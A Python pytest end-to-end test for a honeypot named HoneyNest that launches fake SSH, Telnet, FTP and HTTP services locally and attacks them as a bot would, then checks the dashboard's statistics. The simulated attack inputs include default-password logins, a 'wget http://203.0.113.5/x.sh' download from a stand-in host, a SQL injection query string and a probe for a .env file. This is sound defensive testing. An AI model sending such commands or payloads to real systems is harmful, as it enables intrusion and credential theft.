"""Teste de ponta a ponta: sobe o HoneyNest e ataca cada serviço como um bot faria."""
import asyncio
import base64
import ftplib
import socket

import aiohttp
import asyncssh
import pytest

from honeynest.config import load_config
from honeynest.core import HoneyNest


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


@pytest.fixture
def config(tmp_path):
    cfg = load_config(None)
    cfg["database"] = str(tmp_path / "hn.db")
    cfg["log_file"] = str(tmp_path / "hn.jsonl")
    cfg["services"]["ssh"]["host_key_dir"] = str(tmp_path / "keys")
    for service in cfg["services"].values():
        service["host"] = "127.0.0.1"
        service["port"] = free_port()
    cfg["dashboard"].update(port=free_port(), password="teste")
    cfg["geoip"]["enabled"] = False
    cfg["auth"]["accept_after_attempts"] = 0
    return cfg


async def attack_ssh(port):
    with pytest.raises(asyncssh.PermissionDenied):
        await asyncssh.connect("127.0.0.1", port, username="root", password="errada", known_hosts=None)

    async with asyncssh.connect("127.0.0.1", port, username="root", password="123456", known_hosts=None) as conn:
        assert conn.get_extra_info("server_version") == "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10"
        result = await conn.run("whoami", check=False)
        assert result.stdout == "root\n"

        proc = await conn.create_process(term_type="xterm")
        proc.stdin.write("cat /etc/hostname\nwget http://203.0.113.5/x.sh\nexit\n")
        output = await asyncio.wait_for(proc.stdout.read(), 10)
        assert "Welcome to Ubuntu" in output
        assert "srv-web-01" in output
        assert "logout" in output


async def attack_telnet(port):
    reader, writer = await asyncio.open_connection("127.0.0.1", port)

    async def until(token):
        data = b""
        while token not in data:
            data += await asyncio.wait_for(reader.read(1024), 5)
        return data

    await until(b"login: ")
    writer.write(b"admin\r\n")
    await until(b"Password: ")
    writer.write(b"admin\r\n")
    await until(b"$ ")
    writer.write(b"id\r\n")
    assert b"uid=1000(admin)" in await until(b"$ ")
    writer.write(b"exit\r\n")
    await writer.drain()
    writer.close()


def attack_ftp(port):
    ftp = ftplib.FTP()
    assert "vsFTPd" in ftp.connect("127.0.0.1", port)
    with pytest.raises(ftplib.error_perm, match="530"):
        ftp.login("anonymous", "a@b.c")
    ftp.close()


async def attack_http(port):
    async with aiohttp.ClientSession() as http:
        url = f"http://127.0.0.1:{port}"
        async with http.get(url + "/index.php?id=1' UNION SELECT 1,2--", headers={"User-Agent": "sqlmap/1.7"}) as r:
            assert r.status == 404 and r.headers["Server"] == "Apache/2.4.52 (Ubuntu)"
        async with http.post(url + "/login", data={"username": "admin", "password": "P@ss"}) as r:
            assert r.status == 401
        async with http.get(url + "/.env") as r:
            assert "DB_PASSWORD" in await r.text()


async def check_dashboard(cfg):
    url = f"http://127.0.0.1:{cfg['dashboard']['port']}"
    auth = {"Authorization": "Basic " + base64.b64encode(b"admin:teste").decode()}
    async with aiohttp.ClientSession() as http:
        async with http.get(url + "/api/stats") as r:
            assert r.status == 401
        async with http.get(url + "/", headers=auth) as r:
            assert r.status == 200 and "Content-Security-Policy" in r.headers
        async with http.get(url + "/api/stats", headers=auth) as r:
            return await r.json()


def test_full_attack_flow(config):
    async def scenario():
        honeypot = HoneyNest(config)
        await honeypot.start()
        try:
            services = config["services"]
            await attack_ssh(services["ssh"]["port"])
            await attack_telnet(services["telnet"]["port"])
            await asyncio.get_running_loop().run_in_executor(None, attack_ftp, services["ftp"]["port"])
            await attack_http(services["http"]["port"])
            await asyncio.sleep(0.3)  # Deixa as conexões registrarem a desconexão
            return await check_dashboard(config)
        finally:
            await honeypot.stop()
            honeypot.db.conn.close()

    stats = asyncio.run(scenario())
    totals = stats["totals"]
    assert totals["login_success"] == 2                       # SSH root:123456 e Telnet admin:admin
    assert totals["login_attempts"] == 5                      # + SSH errada, FTP e HTTP
    assert totals["downloads"] == 1
    assert {s["label"] for s in stats["by_service"]} == {"ssh", "telnet", "ftp", "http"}
    assert {a["label"] for a in stats["http_attacks"]} == {"sqli", "scanner"}
